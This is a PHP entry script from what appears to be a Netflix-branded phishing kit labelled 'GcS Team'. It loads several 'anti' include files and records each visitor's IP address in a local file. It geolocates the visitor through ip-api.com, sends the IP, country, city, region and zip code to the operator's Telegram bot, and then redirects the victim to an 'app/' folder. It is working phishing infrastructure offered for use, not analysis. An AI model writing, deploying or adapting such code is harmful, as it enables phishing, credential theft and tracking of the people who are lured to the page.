<?php
/*
  ________             _________    ___________                            
 /  _____/    ____    /   _____/    \__    ___/   ____   _____      _____  
/   \  ___  _/ ___\   \_____  \       |    |    _/ __ \  \__  \    /     \ 
\    \_\  \ \  \___   /        \      |    |    \  ___/   / __ \_ |  Y Y  \
 \______  /  \___  > /_______  /      |____|     \___  > (____  / |__|_|  /
        \/       \/          \/                      \/       \/        \/ 
*/
session_start();
include "anti/anti1.php";
include "anti/anti2.php"; 
include "anti/anti3.php"; 
include "anti/anti4.php"; 
include "anti/anti5.php"; 
include "anti/anti7.php"; 
include "email.php";


$ip = getenv("REMOTE_ADDR");


$file = fopen("NetFlix_VISIT.txt","a");


fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");

$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";

$msg=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE;

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."" );



header("Location: app/");

?>